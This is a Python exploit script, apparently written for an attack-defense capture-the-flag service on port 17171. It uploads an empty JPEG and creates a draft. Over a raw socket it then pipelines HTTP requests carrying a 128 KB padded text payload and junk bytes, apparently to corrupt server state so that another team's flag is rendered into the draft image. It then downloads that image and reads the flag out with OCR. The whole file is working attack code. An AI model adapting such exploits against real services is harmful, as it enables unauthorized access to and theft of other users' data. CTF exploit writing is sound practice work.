#!/usr/bin/env python3.11

import os
import sys
import time
import socket
import secrets
import requests

import pytesseract


IP = sys.argv[1] if len(sys.argv) > 1 else '0.0.0.0'
PORT = 17171

FLAG_ID = sys.argv[2] if len(sys.argv) > 2 else 'aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee'

EMPTY_JPEG = bytes.fromhex('ffd8ffe000104a46494600010100000000000000ffdb004300030202020202030202020303030304060404040404080606050609080a0a090809090a0c0f0c0a0b0e0b09090d110d0e0f101011100a0c12131210130f101010ffc0000b080001000101011100ffc40014000100000000000000000000000000000009ffc40014100100000000000000000000000000000000ffda0008010100003f0054dfffd9')
PAYLOAD_TEXT = 'regular|#abcdef|1|2|3|' + 'A' * 128 * 1024


def main():
    with requests.session() as session:
        response = session.post(f'http://{IP}:{PORT}/images/upload', data = EMPTY_JPEG)
        image_uuid = response.text

        response = requests.post(f'http://{IP}:{PORT}/drafts/create', data = image_uuid)
        draft_uuid = response.text

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)

    sock.connect((IP, PORT))

    lines = [
        f'POST /drafts/text/{draft_uuid} HTTP/1.1',
        f'Host: x',
        f'Content-Length: {len(PAYLOAD_TEXT)}',
        f'',
        PAYLOAD_TEXT,
    ]
    sock.send('\n'.join(lines).encode())

    lines = [
        f'POST /drafts/background/{draft_uuid} HTTP/1.1',
        f'Host: x',
        f'Content-Length: {len(FLAG_ID)}',
        f'',
        FLAG_ID,
    ]
    sock.send('\n'.join(lines).encode())

    lines = [
        f'\x01\x02\x03\x04\x05',
        f'',
    ]
    sock.send('\n'.join(lines).encode())

    time.sleep(2)

    sock.close()

    with requests.session() as session:
        response = session.get(f'http://{IP}:{PORT}/drafts/view/{draft_uuid}')
        flag_image = response.content

    filename = secrets.token_hex(8) + '.jpg'

    with open(filename, 'wb') as file:
        file.write(flag_image)

    flag = pytesseract.image_to_string(filename)
    print(flag)

    os.unlink(filename)


if __name__ == '__main__':
    main()